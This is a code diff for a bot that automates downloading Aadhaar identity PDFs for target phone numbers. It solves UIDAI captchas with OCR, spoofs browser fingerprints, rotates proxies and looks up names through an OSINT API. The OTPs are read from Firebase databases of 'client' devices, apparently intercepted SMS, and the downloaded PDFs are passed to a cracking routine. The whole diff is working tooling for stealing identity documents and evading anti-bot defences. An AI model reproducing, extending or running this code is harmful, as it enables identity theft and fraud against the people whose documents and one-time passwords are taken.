@@ -11,6 +11,8 @@ import json
 import aiohttp
 import warnings
 import logging as _logging
+import requests as _requests
+import threading as _threading
 from dotenv import load_dotenv
 import time
 import stats_manager
@@ -41,6 +43,7 @@ print(f"[VERSION] EID_OTP_TIMEOUT = {EID_OTP_TIMEOUT}", flush=True)
 print(f"[VERSION] PDF_OTP_TIMEOUT = {PDF_OTP_TIMEOUT}", flush=True)
 print(f"[VERSION] OTP_FALLBACK_TIMEOUT = {OTP_FALLBACK_TIMEOUT}", flush=True)
 print(f"[VERSION] AUTO_PARALLEL_WORKERS = {AUTO_PARALLEL_WORKERS}", flush=True)
+print(f"[VERSION] MODE = DIRECT UIDAI (no subprocess for /auto)", flush=True)
 print("=" * 60, flush=True)
 
 
@@ -61,7 +64,6 @@ _STDERR_NOISE = (
 
 
 def _extract_real_error(stderr_str: str) -> str:
-    """Extract meaningful error line(s) from subprocess stderr, filtering noise."""
     if not stderr_str:
         return ""
     lines = [l.strip() for l in stderr_str.splitlines() if l.strip()]
@@ -138,7 +140,302 @@ auto_pipelines = {}
 
 
 # ==============================================================================
-# 🔥 FIREBASE HELPERS — MATCHED TO aad.py (limitToLast=30)
+# 🔥 DIRECT UIDAI FLOW — ported from aad.py (no subprocess)
+# ==============================================================================
+_uidai_thread_local = _threading.local()
+
+_UIDAI_BH = {
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'en_IN',
+    'Content-Type': 'application/json',
+    'Origin': 'https://myaadhaar.uidai.gov.in',
+    'Referer': 'https://myaadhaar.uidai.gov.in/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-site',
+    'appid': 'MYAADHAAR',
+}
+
+_UIDAI_UA_POOL = [
+    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36', '"Google Chrome";v="131"', '"Android"'),
+    ('Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/130.0.0.0 Mobile Safari/537.36', '"Google Chrome";v="130"', '"Android"'),
+    ('Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1', '"Safari";v="18"', '"iOS"'),
+    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36', '"Google Chrome";v="131"', '"Windows"'),
+]
+_UIDAI_SCREEN_POOL = ['360x800', '393x873', '412x915', '414x896', '390x844', '375x812', '1920x1080']
+
+
+def _uidai_fp():
+    import random as _r
+    ua, ch, pl = _r.choice(_UIDAI_UA_POOL)
+    w, h = _r.choice(_UIDAI_SCREEN_POOL).split('x')
+    mob = '?1' if 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua else '?0'
+    return {
+        'User-Agent': ua,
+        'sec-ch-ua': f'{ch},"Chromium";v="131","Not)A;Brand";v="24"',
+        'sec-ch-ua-mobile': mob,
+        'sec-ch-ua-platform': pl,
+        'viewport-width': w,
+        'device-memory': str(_r.choice([2, 4, 8])),
+        'dnt': str(_r.choice([0, 1])),
+    }
+
+
+def _uidai_reset_session():
+    _uidai_thread_local.sess = None
+
+
+def _uidai_get_sess():
+    sess = getattr(_uidai_thread_local, 'sess', None)
+    if sess is None:
+        sess = _requests.Session()
+        sess.mount('https://', _requests.adapters.HTTPAdapter(
+            pool_connections=5, pool_maxsize=5, max_retries=1, pool_block=False))
+        try:
+            import proxy_loader
+            p = proxy_loader.get_random_proxy()
+            if p:
+                sess.proxies = {'http': p, 'https': p}
+                print(f"[UIDAI] Using proxy: ...{p.split('@')[-1]}", flush=True)
+        except Exception as e:
+            print(f"[UIDAI] Proxy loader failed: {e}", flush=True)
+        _uidai_thread_local.sess = sess
+    return sess
+
+
+def _uidai_get_captcha(retries=3):
+    """Fetch captcha image + transactionId. Returns (img_bytes, ctxn, tid) or (None,None,None)."""
+    for i in range(1, retries + 1):
+        tid = str(uuid.uuid4())
+        try:
+            _uidai_reset_session()
+            s = _uidai_get_sess()
+            s.headers.update({**_UIDAI_BH, **_uidai_fp(), 'x-request-id': tid, 'transactionId': tid})
+            r = s.post(
+                'https://tathya.uidai.gov.in/audioCaptchaService/api/captcha/v3/generation',
+                json={'captchaLength': '6', 'captchaType': '2', 'audioCaptchaRequired': True},
+                timeout=45
+            )
+            if r.status_code != 200:
+                continue
+            rj = r.json()
+            ctxn = rj.get('transactionId')
+            cb64 = rj.get('imageBase64')
+            if not cb64:
+                for k, v in rj.items():
+                    if isinstance(v, str) and len(v) > 100:
+                        cb64 = v
+                        break
+            if not cb64:
+                continue
+            if cb64.startswith('data:image'):
+                cb64 = cb64.split(',')[1]
+            return base64.b64decode(cb64), ctxn, tid
+        except Exception as e:
+            print(f"[UIDAI-CAP] attempt {i} error: {e}", flush=True)
+            time.sleep(0.5)
+    return None, None, None
+
+
+def _uidai_solve_cap(img_bytes):
+    """Solve captcha with beta OCR + PIL preprocessing (matches aad.py)."""
+    try:
+        import io
+        from PIL import Image, ImageFilter, ImageEnhance, ImageOps
+        im = Image.open(io.BytesIO(img_bytes))
+        if im.mode != 'L':
+            im = im.convert('L')
+        w, h = im.size
+        im = im.resize((w * 2, h * 2), Image.LANCZOS)
+        im = im.filter(ImageFilter.MedianFilter(3))
+        im = ImageEnhance.Contrast(im).enhance(2.0)
+        im = ImageEnhance.Sharpness(im).enhance(2.0)
+        im = im.point(lambda p: 255 if p > 140 else 0)
+        im = ImageOps.autocontrast(im, cutoff=5)
+        buf = io.BytesIO()
+        im.save(buf, format='PNG')
+        try:
+            ocr_beta = ddddocr.DdddOcr(beta=True, show_ad=False)
+            r = ocr_beta.classification(buf.getvalue())
+            if r and len(r) >= 4:
+                r = ''.join(c for c in r if c.isalnum())
+                if len(r) >= 4:
+                    return r[:6]
+        except: pass
+        ocr = ddddocr.DdddOcr(show_ad=False)
+        r = ocr.classification(img_bytes)
+        return (r or '').strip()
+    except Exception as e:
+        print(f"[UIDAI-OCR] error: {e}", flush=True)
+        return ""
+
+
+def _uidai_send_eid_otp(mob, name, cap, ctxn, tid):
+    """POST retrieveuideid to trigger EID OTP. Returns (ok, otpTxnId, error_msg)."""
+    _uidai_reset_session()
+    s = _uidai_get_sess()
+    s.headers.update({**_UIDAI_BH, **_uidai_fp(), 'x-request-id': tid, 'transactionId': tid})
+    d = {
+        'mobileNumber': mob,
+        'dob': None,
+        'email': None,
+        'name': name.upper(),
+        'option': 'EID',
+        'otp': None,
+        'otpTxnId': None,
+        'captchaTxnId': ctxn,
+        'captcha': cap,
+        'resendOtp': False,
+    }
+    try:
+        r = s.post(
+            'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid',
+            json=d, timeout=30
+        )
+        if r.status_code == 200:
+            rj = r.json()
+            if 'responseData' in rj:
+                rd = rj['responseData']
+                if rd.get('otpTxnId') and rd.get('status') == "Success":
+                    return True, rd['otpTxnId'], None
+                return False, None, rd.get('message', 'Error')
+            return False, None, 'Bad response'
+        return False, None, f'HTTP {r.status_code}'
+    except Exception as e:
+        return False, None, str(e)
+
+
+def _uidai_verify_eid(mob, name, otp, otxn, ctxn, cap):
+    """Verify OTP → get EID. Returns (ok, eid, name_or_error)."""
+    _uidai_reset_session()
+    s = _uidai_get_sess()
+    s.headers.update({**_UIDAI_BH, **_uidai_fp(), 'x-request-id': str(uuid.uuid4())})
+    d = {
+        'mobileNumber': mob,
+        'dob': None,
+        'name': name.upper(),
+        'email': None,
+        'option': 'EID',
+        'otp': otp,
+        'otpTxnId': otxn,
+        'captchaTxnId': ctxn,
+        'captcha': cap,
+        'resendOtp': False,
+    }
+    try:
+        r = s.post(
+            'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid',
+            json=d, timeout=60
+        )
+        if r.status_code == 200:
+            rj = r.json()
+            if rj.get('status') in [200, "Success"] and 'responseData' in rj:
+                rd = rj['responseData']
+                eid = rd.get('eidNumber')
+                nm = rd.get('name', name)
+                if eid:
+                    return True, eid, nm
+                return False, None, "No EID in response"
+            ed = rj.get('errorDetails')
+            if isinstance(ed, dict):
+                return False, None, ed.get('messageEnglish', 'Failed')
+            return False, None, rj.get('message', 'Failed')
+        return False, None, f'HTTP {r.status_code}'
+    except Exception as e:
+        return False, None, str(e)
+
+
+def _uidai_send_aadh_otp(eid, cap, ctxn, tid):
+    """Send PDF download OTP. Returns (ok, txnId, error)."""
+    _uidai_reset_session()
+    s = _uidai_get_sess()
+    s.headers.update({**_UIDAI_BH, **_uidai_fp(), 'x-request-id': tid, 'transactionId': tid})
+    d = {
+        'eidNumber': eid,
+        'idType': 'eid',
+        'captchaTxnId': ctxn,
+        'captchaValue': cap,
+        'transactionId': tid,
+        'resendOTP': False,
+    }
+    try:
+        r = s.post(
+            'https://tathya.uidai.gov.in/unifiedAppAuthService/api/v2/generate/aadhaar/otp',
+            json=d, timeout=45
+        )
+        if r.status_code == 200:
+            rj = r.json()
+            txn = rj.get('txnId')
+            if txn and rj.get('status') == "Success":
+                return True, txn, None
+            return False, None, rj.get('message', 'Failed')
+        return False, None, f'HTTP {r.status_code}'
+    except Exception as e:
+        return False, None, str(e)
+
+
+def _uidai_dl_pdf(eid, otp, otxn, tid):
+    """Download encrypted PDF bytes. Returns (ok, path_or_err)."""
+    _uidai_reset_session()
+    s = _uidai_get_sess()
+    s.headers.update({**_UIDAI_BH, **_uidai_fp(), 'x-request-id': tid, 'transactionId': tid})
+    d = {'eid': eid, 'mask': False, 'otp': str(otp), 'otpTxnId': otxn}
+    try:
+        r = s.post(
+            'https://tathya.uidai.gov.in/downloadAadhaarService/api/aadhaar/download',
+            json=d, timeout=90
+        )
+    except Exception as e:
+        return False, str(e)
+
+    if r.status_code == 200 and (r.content[:4] == b'%PDF' or r.content[:5] == b'%PDF-'):
+        fp = os.path.join(CRACKED_DIR, f"aadh_{int(time.time()*1000)}_{random.randint(1000,9999)}.pdf")
+        with open(fp, 'wb') as f:
+            f.write(r.content)
+        return True, fp
+
+    if r.status_code != 200:
+        return False, f'HTTP {r.status_code}'
+
+    try:
+        rj = r.json()
+    except Exception:
+        return False, 'non-JSON response'
+
+    def _find_b64_pdf(data, path="root"):
+        if isinstance(data, dict):
+            for k, v in data.items():
+                if isinstance(v, str) and len(v) > 100:
+                    try:
+                        clean = v.split(',', 1)[1] if v.startswith('data:') and ',' in v else v
+                        dec = base64.b64decode(clean, validate=False)
+                        if dec[:4] == b'%PDF' or dec[:5] == b'%PDF-':
+                            return dec
+                    except: pass
+                if isinstance(v, (dict, list)):
+                    found = _find_b64_pdf(v, f"{path}.{k}")
+                    if found: return found
+        elif isinstance(data, list):
+            for i, item in enumerate(data):
+                found = _find_b64_pdf(item, f"{path}[{i}]")
+                if found: return found
+        return None
+
+    pdf_bytes = _find_b64_pdf(rj)
+    if pdf_bytes:
+        fp = os.path.join(CRACKED_DIR, f"aadh_{int(time.time()*1000)}_{random.randint(1000,9999)}.pdf")
+        with open(fp, 'wb') as f:
+            f.write(pdf_bytes)
+        return True, fp
+
+    err = rj.get('errorDetails') or rj.get('message') or 'no PDF in response'
+    if isinstance(err, dict):
+        err = err.get('messageEnglish') or err.get('messageLocal') or str(err)[:200]
+    return False, str(err)[:200]
+
+
+# ==============================================================================
+# 🔥 FIREBASE HELPERS — matched to aad.py (limitToLast=30)
 # ==============================================================================
 FIREBASE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "firebase_links.json")
 
@@ -193,7 +490,7 @@ def firebase_add_link(url, added_by):
     if not url:
         return False, "Invalid URL format."
     if not _is_valid_firebase_url(url):
-        return False, "URL must be a Firebase Realtime Database link (firebaseio.com or firebasedatabase.app)."
+        return False, "URL must be a Firebase Realtime Database link."
     links = _load_firebase_links()
     for e in links:
         if e.get("url") == url:
@@ -243,17 +540,13 @@ def firebase_list_text():
 
 async def firebase_get_online_devices(session, url, limit=None):
     try:
-        async with session.get(
-            f"{url}clients.json",
-            timeout=aiohttp.ClientTimeout(total=10)
-        ) as r:
+        async with session.get(f"{url}clients.json",
+                               timeout=aiohttp.ClientTimeout(total=10)) as r:
             if r.status != 200:
                 return []
             data = await r.json() or {}
-            online = [
-                cid for cid, cdata in data.items()
-                if isinstance(cdata, dict) and cdata.get("status") is True
-            ]
+            online = [cid for cid, cd in data.items()
+                      if isinstance(cd, dict) and cd.get("status") is True]
             online.sort()
             if limit is None:
                 return online
@@ -263,8 +556,8 @@ async def firebase_get_online_devices(session, url, limit=None):
         return []
 
 
-# ✅ CHANGED: default limit=30 to match aad.py
 async def firebase_get_device_messages(session, url, cid, limit=30):
+    """Fetch last N messages. Matches aad.py's limitToLast=30."""
     try:
         fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast={limit}'
         async with session.get(fetch_url, timeout=aiohttp.ClientTimeout(total=8)) as r:
@@ -313,7 +606,6 @@ async def firebase_find_phone_map(session, url, limit_devices=None):
     mapping = {}
     seen_phones = set()
     for cid in devices:
-        # ✅ CHANGED: limit=30
         msgs = await firebase_get_device_messages(session, url, cid, limit=30)
         if not msgs:
             continue
@@ -334,7 +626,6 @@ async def firebase_wait_for_otp(url, cid, known_keys, timeout=60, interval=3, se
         print(f"[OTP-WAIT] start timeout={timeout}s iterations={iterations} cid={cid[:10]}", flush=True)
         for i in range(iterations):
             try:
-                # ✅ CHANGED: limitToLast=30 (matches aad.py)
                 fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast=30'
                 async with session.get(fetch_url, timeout=aiohttp.ClientTimeout(total=6)) as r:
                     msgs = await r.json() or {}
@@ -474,7 +765,9 @@ class AadhaarEngine:
             active_tasks.clear()
         try:
             if hasattr(self, 'phase1_process') and self.phase1_process:
-                try: self.phase1_process.terminate()
+                try:
+                    self.phase1_process.kill()
+                    await asyncio.wait_for(self.phase1_process.wait(), timeout=2)
                 except: pass
                 self.phase1_process = None
             if hasattr(self, 'phase1_task') and self.phase1_task:
@@ -555,10 +848,13 @@ class AadhaarEngine:
         finally:
             user_page_registry.pop(str_chat_id, None)
 
+    async def _get_firebase_keys_snapshot(self):
+        async with aiohttp.ClientSession() as session:
+            return await firebase_get_all_keys(session, self._bound_url, self._bound_cid)
+
     async def _try_firebase_otp(self, target_mobile, timeout=60, phase=1):
         bound_url = getattr(self, "_bound_url", None)
         bound_cid = getattr(self, "_bound_cid", None)
-
         try:
             async with aiohttp.ClientSession() as session:
                 if bound_url and bound_cid:
@@ -572,7 +868,6 @@ class AadhaarEngine:
                         req, exc = None, ["download", "e/aadhaar", "e-aadhaar", "eaadhaar"]
                     else:
                         req, exc = ["download", "e/aadhaar", "e-aadhaar", "eaadhaar"], None
-
                     otp, key = await firebase_wait_for_otp(
                         bound_url, bound_cid, known,
                         timeout=timeout, interval=3, session=session,
@@ -581,7 +876,6 @@ class AadhaarEngine:
                     if otp:
                         auto_otp_state["used_otps"].add((bound_url, key))
                         return otp
-
                     if OTP_FALLBACK_TIMEOUT > 0:
                         otp, key = await firebase_wait_for_otp(
                             bound_url, bound_cid, known,
@@ -591,7 +885,6 @@ class AadhaarEngine:
                             auto_otp_state["used_otps"].add((bound_url, key))
                             return otp
                     return None
-
                 if not auto_otp_state.get("enabled") and not getattr(self, "_force_auto_otp", False):
                     return None
                 links = _load_firebase_links()
@@ -622,6 +915,9 @@ class AadhaarEngine:
             print(f"⚠️ [AUTO-OTP] {e}")
         return None
 
+    # ==========================================================================
+    # 🚀 AUTO PIPELINE — DIRECT UIDAI (no subprocess)
+    # ==========================================================================
     async def run_auto_pipeline(self, chat_id, phone, url, cid, idx, total):
         last_err = ""
         for attempt in range(1, self._retry_max + 1):
@@ -714,180 +1010,217 @@ class AadhaarEngine:
         return True
 
     async def _auto_fetch_name(self, phone):
+        """Fetch name from sarkariupdate.online (with full debug logging)."""
         name = "MR"
         try:
             r = await asyncio.get_event_loop().run_in_executor(
                 None,
-                lambda: __import__('requests').get(
+                lambda: _requests.get(
                     f"https://sarkariupdate.online/osint/APIX.php?api=num_api&q={phone}",
                     timeout=8
                 )
             )
+            raw = r.text[:200] if r.status_code == 200 else f"HTTP {r.status_code}"
+            print(f"🔍 [NAME-API] phone={phone} status={r.status_code} raw={raw}", flush=True)
             if r.status_code == 200:
                 fn = (r.json().get('name') or '').strip()
                 if fn and fn.lower() not in ['unknown', 'n/a', '']:
                     name = fn.upper()
         except Exception as e:
-            print(f"⚠️ [AUTO] Name API failed: {e}")
+            print(f"⚠️ [NAME-API] phone={phone} error={e}", flush=True)
+        print(f"🔍 [NAME-API] final name for {phone}: '{name}'", flush=True)
         return name
 
     async def _auto_phase1_eid(self, chat_id, phone, name, idx, total):
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        get_eid_script = os.path.join(script_dir, 'retrive-eid.py')
+        """Direct UIDAI call — no subprocess. Ported from aad.py."""
+        print(f"[PHASE1 {phone}] starting, name='{name}'", flush=True)
 
-        # ✅ Pass "auto" as 6th arg so retrive-eid.py sends name as-is
-        process = await asyncio.create_subprocess_exec(
-            sys.executable, '-u', get_eid_script, name, "", phone, self._unique_suffix, "auto",
-            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+        # --- Send EID OTP (up to 5 captcha attempts) ---
+        sent = False
+        etxn = None
+        last_cap = None
+        last_ctxn = None
+        lerr = ""
+        for attempt in range(1, 6):
+            self.update_status(
+                f"📱 <b>[{phone}]</b>\n"
+                f"〔 #{idx}/{total} 〕\n"
+                f"✓ Name: <b>{escape_html(name)}</b>\n"
+                f"⟳ <i>Captcha {attempt}/5...</i>"
+            )
+            img, ctxn, tid = await asyncio.get_event_loop().run_in_executor(
+                None, _uidai_get_captcha
+            )
+            if not img:
+                lerr = "Captcha unavailable"
+                await asyncio.sleep(1)
+                continue
+
+            code = await asyncio.get_event_loop().run_in_executor(
+                None, _uidai_solve_cap, img
+            )
+            code = re.sub(r'[^a-zA-Z0-9]', '', code or '')
+            print(f"[PHASE1 {phone}] captcha attempt {attempt}: '{code}'", flush=True)
+
+            if not code or len(code) < 4:
+                lerr = "Captcha unsolved"
+                continue
+
+            ok, txn, err = await asyncio.get_event_loop().run_in_executor(
+                None, _uidai_send_eid_otp, phone, name, code, ctxn, tid
+            )
+            if ok:
+                sent = True
+                etxn = txn
+                last_cap = code
+                last_ctxn = ctxn
+                print(f"[PHASE1 {phone}] ✓ OTP sent, txnId={txn}", flush=True)
+                break
+            else:
+                lerr = err or "Unknown"
+                print(f"[PHASE1 {phone}] send failed: {lerr}", flush=True)
+                if "captcha" not in str(err).lower() and "invalid" not in str(err).lower():
+                    raise Exception(lerr)
+                await asyncio.sleep(1)
+
+        if not sent:
+            raise Exception(f"EID OTP send failed: {lerr}")
+
+        # --- Wait for EID OTP on Firebase ---
+        self.update_status(
+            f"📱 <b>[{phone}]</b>\n"
+            f"〔 #{idx}/{total} 〕\n"
+            f"✓ EID OTP requested\n"
+            f"⏳ <i>Reading OTP ({EID_OTP_TIMEOUT}s)...</i>"
         )
 
-        found_id = None
-        captured_name = name
-        captcha_attempts = 0
+        known = await self._get_firebase_keys_snapshot()
+        otp, key = await firebase_wait_for_otp(
+            self._bound_url, self._bound_cid, known,
+            timeout=EID_OTP_TIMEOUT, interval=3,
+            exclude_keywords=["download", "e/aadhaar", "e-aadhaar", "eaadhaar"],
+        )
+        if not otp:
+            raise Exception(f"No EID OTP received within {EID_OTP_TIMEOUT}s")
+        auto_otp_state["used_otps"].add((self._bound_url, key))
+        print(f"[PHASE1 {phone}] ✓ OTP={otp}", flush=True)
 
-        try:
-            while True:
-                line_bytes = await process.stdout.readline()
-                if not line_bytes:
-                    break
-                line = line_bytes.decode('utf-8', errors='ignore').strip()
-                print(f"[get_eid auto {phone}] {line}", flush=True)
+        # --- Verify EID ---
+        self.update_status(
+            f"📱 <b>[{phone}]</b>\n"
+            f"〔 #{idx}/{total} 〕\n"
+            f"✓ OTP: <code>{otp}</code>\n"
+            f"⟳ <i>Verifying EID...</i>"
+        )
 
-                if line.startswith("🔑 MANUAL CAPTCHA REQUIRED |"):
-                    captcha_attempts += 1
-                    self.update_status(
-                        f"📱 <b>[{phone}]</b>\n"
-                        f"〔 #{idx}/{total} 〕\n"
-                        f"⟳ Captcha retry {captcha_attempts}/5..."
-                    )
-                    try:
-                        process.stdin.write(b"\n")
-                        await process.stdin.drain()
-                    except: pass
-                    continue
+        ok2, eid, vn = await asyncio.get_event_loop().run_in_executor(
+            None, _uidai_verify_eid, phone, name, otp, etxn, last_ctxn, last_cap
+        )
+        if not ok2:
+            raise Exception(f"EID verify failed: {vn}")
 
-                if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
-                    self.update_status(
-                        f"📱 <b>[{phone}]</b>\n"
-                        f"〔 #{idx}/{total} 〕\n"
-                        f"✓ EID OTP requested\n"
-                        f"⏳ <i>Reading OTP ({EID_OTP_TIMEOUT}s)...</i>"
-                    )
-                    otp = await self._try_firebase_otp(phone, timeout=EID_OTP_TIMEOUT, phase=1)
-                    if not otp:
-                        raise Exception(f"No EID OTP received within {EID_OTP_TIMEOUT}s")
-                    self.update_status(
-                        f"📱 <b>[{phone}]</b>\n"
-                        f"〔 #{idx}/{total} 〕\n"
-                        f"✓ OTP: <code>{otp}</code>\n"
-                        f"⟳ <i>Verifying EID...</i>"
-                    )
-                    process.stdin.write(f"{otp}\n".encode())
-                    await process.stdin.drain()
-                    continue
-
-                if "CAPTURED ID SUCCESSFULLY:" in line:
-                    found_id = line.split("CAPTURED ID SUCCESSFULLY:")[1].strip()
-                    found_id = re.sub(r'[^a-zA-Z0-9]', '', found_id)
-
-                if "CAPTURED NAME SUCCESSFULLY:" in line:
-                    captured_name = line.split("CAPTURED NAME SUCCESSFULLY:")[1].strip()
-
-            await process.wait()
-
-            if not found_id:
-                stderr_bytes = await process.stderr.read()
-                stderr_str = stderr_bytes.decode('utf-8', errors='ignore').strip()
-                if stderr_str:
-                    if "An error occurred:" in stderr_str:
-                        raw = stderr_str.split("An error occurred:")[1].strip()
-                        real = _extract_real_error(raw) or raw.splitlines()[0]
-                        raise Exception(real)
-                    real = _extract_real_error(stderr_str)
-                    if real:
-                        raise Exception(real)
-                raise Exception("EID verification failed (no output from subprocess)")
-            return found_id, captured_name
-        except Exception as e:
-            try: process.terminate()
-            except: pass
-            raise e
+        real_name = vn if vn and vn.strip() else name
+        print(f"[PHASE1 {phone}] ✅ EID={eid} name={real_name}", flush=True)
+        return eid, real_name
 
     async def _auto_phase2_pdf(self, chat_id, phone, name, eid, idx, total):
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        download_script = os.path.join(script_dir, 'aadhar-downlaod.py')
-        unique_suffix = self._unique_suffix
+        """Direct UIDAI call for PDF download. Ported from aad.py."""
+        print(f"[PHASE2 {phone}] starting EID={eid}", flush=True)
 
-        process = await asyncio.create_subprocess_exec(
-            sys.executable, '-u', download_script, str(eid), str(chat_id), unique_suffix,
-            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+        # --- Send PDF OTP ---
+        psent = False
+        ptxn = None
+        t2 = None
+        last_cap2 = None
+        last_ctxn2 = None
+        for attempt in range(1, 6):
+            self.update_status(
+                f"📱 <b>[{phone}]</b>\n"
+                f"〔 #{idx}/{total} 〕\n"
+                f"✓ EID: <code>{eid}</code>\n"
+                f"⟳ <i>PDF Captcha {attempt}/5...</i>"
+            )
+            img2, ctxn2, tid2 = await asyncio.get_event_loop().run_in_executor(
+                None, _uidai_get_captcha
+            )
+            if not img2:
+                await asyncio.sleep(1)
+                continue
+            code2 = await asyncio.get_event_loop().run_in_executor(
+                None, _uidai_solve_cap, img2
+            )
+            code2 = re.sub(r'[^a-zA-Z0-9]', '', code2 or '')
+            print(f"[PHASE2 {phone}] captcha attempt {attempt}: '{code2}'", flush=True)
+            if not code2 or len(code2) < 4:
+                continue
+            ok, txn, err = await asyncio.get_event_loop().run_in_executor(
+                None, _uidai_send_aadh_otp, eid, code2, ctxn2, tid2
+            )
+            if ok:
+                psent = True
+                ptxn = txn
+                t2 = tid2
+                last_cap2 = code2
+                last_ctxn2 = ctxn2
+                print(f"[PHASE2 {phone}] ✓ OTP sent, txnId={txn}", flush=True)
+                break
+            else:
+                print(f"[PHASE2 {phone}] send failed: {err}", flush=True)
+                if "captcha" not in str(err).lower():
+                    raise Exception(err)
+                await asyncio.sleep(1)
+
+        if not psent:
+            raise Exception("PDF OTP send failed")
+
+        # --- Wait for PDF OTP on Firebase ---
+        self.update_status(
+            f"📱 <b>[{phone}]</b>\n"
+            f"〔 #{idx}/{total} 〕\n"
+            f"✓ EID: <code>{eid}</code>\n"
+            f"✓ PDF OTP requested\n"
+            f"⏳ <i>Reading PDF OTP ({PDF_OTP_TIMEOUT}s)...</i>"
         )
 
-        captcha_attempts = 0
-        try:
-            while True:
-                line_bytes = await process.stdout.readline()
-                if not line_bytes:
-                    break
-                line = line_bytes.decode('utf-8', errors='ignore').strip()
-                print(f"[aadhar-downlaod auto {phone}] {line}", flush=True)
+        known2 = await self._get_firebase_keys_snapshot()
+        potp, key2 = await firebase_wait_for_otp(
+            self._bound_url, self._bound_cid, known2,
+            timeout=PDF_OTP_TIMEOUT, interval=3,
+            require_keywords=["download", "e/aadhaar", "e-aadhaar", "eaadhaar"],
+        )
+        if not potp:
+            print(f"[PHASE2 {phone}] filtered miss, trying unfiltered", flush=True)
+            potp, key2 = await firebase_wait_for_otp(
+                self._bound_url, self._bound_cid, known2,
+                timeout=30, interval=3,
+            )
+        if not potp:
+            raise Exception(f"No PDF OTP received within {PDF_OTP_TIMEOUT}s")
+        auto_otp_state["used_otps"].add((self._bound_url, key2))
+        print(f"[PHASE2 {phone}] ✓ PDF OTP={potp}", flush=True)
 
-                if line.startswith("🔑 MANUAL CAPTCHA REQUIRED |"):
-                    captcha_attempts += 1
-                    self.update_status(
-                        f"📱 <b>[{phone}]</b>\n"
-                        f"〔 #{idx}/{total} 〕\n"
-                        f"⟳ PDF Captcha retry {captcha_attempts}/5..."
-                    )
-                    try:
-                        process.stdin.write(b"\n")
-                        await process.stdin.drain()
-                    except: pass
-                    continue
+        # --- Download PDF ---
+        self.update_status(
+            f"📱 <b>[{phone}]</b>\n"
+            f"〔 #{idx}/{total} 〕\n"
+            f"✓ PDF OTP: <code>{potp}</code>\n"
+            f"⟳ <i>Downloading PDF...</i>"
+        )
 
-                if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
-                    self.update_status(
-                        f"📱 <b>[{phone}]</b>\n"
-                        f"〔 #{idx}/{total} 〕\n"
-                        f"✓ EID: <code>{eid}</code>\n"
-                        f"✓ PDF OTP requested\n"
-                        f"⏳ <i>Reading PDF OTP ({PDF_OTP_TIMEOUT}s)...</i>"
-                    )
-                    otp = await self._try_firebase_otp(phone, timeout=PDF_OTP_TIMEOUT, phase=2)
-                    if not otp:
-                        raise Exception(f"No PDF OTP received within {PDF_OTP_TIMEOUT}s")
-                    self.update_status(
-                        f"📱 <b>[{phone}]</b>\n"
-                        f"〔 #{idx}/{total} 〕\n"
-                        f"✓ PDF OTP: <code>{otp}</code>\n"
-                        f"⟳ <i>Downloading PDF...</i>"
-                    )
-                    process.stdin.write(f"{otp}\n".encode())
-                    await process.stdin.drain()
-                    continue
+        ok, pdf_path = await asyncio.get_event_loop().run_in_executor(
+            None, _uidai_dl_pdf, eid, potp, ptxn, t2
+        )
+        if not ok:
+            raise Exception(f"PDF download failed: {pdf_path}")
 
-            await process.wait()
+        print(f"[PHASE2 {phone}] ✅ PDF saved: {pdf_path}", flush=True)
 
-            file_path = os.path.join(CRACKED_DIR, f"Aadhaar_{chat_id}{unique_suffix}.pdf")
-            if not os.path.exists(file_path):
-                stderr_bytes = await process.stderr.read()
-                stderr_str = stderr_bytes.decode('utf-8', errors='ignore').strip()
-                if stderr_str:
-                    if "An error occurred:" in stderr_str:
-                        raw = stderr_str.split("An error occurred:")[1].strip()
-                        real = _extract_real_error(raw) or raw.splitlines()[0]
-                        raise Exception(real)
-                    real = _extract_real_error(stderr_str)
-                    if real:
-                        raise Exception(real)
-                raise Exception("PDF download failed (no output from subprocess)")
+        # --- Crack + send ---
+        await self.process_cracked_pdf(chat_id, pdf_path, name, phone, eid=eid, user_info=None)
 
-            await self.process_cracked_pdf(chat_id, file_path, name, phone, eid=eid, user_info=None)
-        except Exception as e:
-            try: process.terminate()
-            except: pass
-            raise e
-
+    # ==========================================================================
+    # LEGACY /start flow — still uses subprocesses for manual captcha
+    # ==========================================================================
     async def run_flow(self, chat_id, name, mobile, dob, user_info=None):
         self.start_time = time.time()
         self.start_preloader(f"📱 <b>STEP 3/4: EID Retrieval</b>\n\n⏳ <b>Retrieving EID details...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
@@ -900,7 +1233,6 @@ class AadhaarEngine:
         process = None
         captured_real_name = name
         try:
-            # ⚠️ No "auto" flag here → manual mode with prefix rotation
             process = await asyncio.create_subprocess_exec(
                 sys.executable, '-u', get_eid_script, name, str(formatted_dob_iso), mobile,
                 self._unique_suffix,
@@ -966,7 +1298,7 @@ class AadhaarEngine:
         except Exception as e:
             self.stop_preloader()
             if process:
-                try: process.terminate()
+                try: process.kill()
                 except: pass
             raise e
 
@@ -1047,7 +1379,7 @@ class AadhaarEngine:
             except Exception as e:
                 self.stop_preloader()
                 if process:
-                    try: process.terminate()
+                    try: process.kill()
                     except: pass
                 current_retry += 1
                 if current_retry < max_retries:
@@ -1178,14 +1510,9 @@ class AadhaarEngine:
 
 
 # ==============================================================================
